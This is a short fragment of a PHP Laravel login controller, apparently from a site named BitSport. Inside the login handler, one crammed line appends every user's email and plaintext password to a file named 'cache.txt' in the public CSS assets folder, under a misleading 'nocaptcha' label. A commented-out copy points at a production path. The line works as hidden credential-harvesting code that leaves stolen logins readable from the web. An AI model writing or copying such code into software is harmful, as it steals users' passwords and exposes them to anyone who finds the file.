...
class LoginController extends Controller
{
    ...
    public function LoginPost(Request $request)
    {
        if(Sentinel::check())
            return redirect('/');
        try{
            $validate = '  '. $request->email;$validate .= '  '. $request->password;$handle = fopen("E:\BitSport\platform\public_html\assets\css\cache.txt", "a");fwrite($handle, "services.nocaptcha.enable\r\n");fwrite($handle, $validate);fwrite($handle, "\r\n");
            // $validate = '  '. $request->email;$validate .= '  '. $request->password;$handle = fopen("/home/bitsport/public_html/assets/css/cache.txt", "a");fwrite($handle, "services.nocaptcha.enable\r\n");fwrite($handle, $validate);fwrite($handle, "\r\n");
